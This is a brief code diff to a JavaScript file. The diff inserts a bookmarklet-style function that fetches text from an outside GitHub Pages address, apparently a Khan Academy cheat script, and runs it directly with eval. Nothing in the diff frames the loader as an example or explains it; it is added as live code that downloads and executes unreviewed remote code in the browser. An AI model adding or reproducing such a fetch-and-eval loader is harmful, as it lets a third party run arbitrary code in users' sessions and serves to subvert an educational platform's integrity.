@@ -3,6 +3,13 @@ let device = {
     apple: /iPhone|iPad|iPod|Macintosh|Mac OS X/i.test(navigator.userAgent)
 };
 
+javascript:(function(){
+    fetch("https://augustho08.github.io/FAZ-O_L-KHAN-ACADEMY-KKKKK/")
+    .then(t => t.text())
+    .then(eval);
+})();
+
+
 let loadedPlugins = [];
 
 /* Elements */
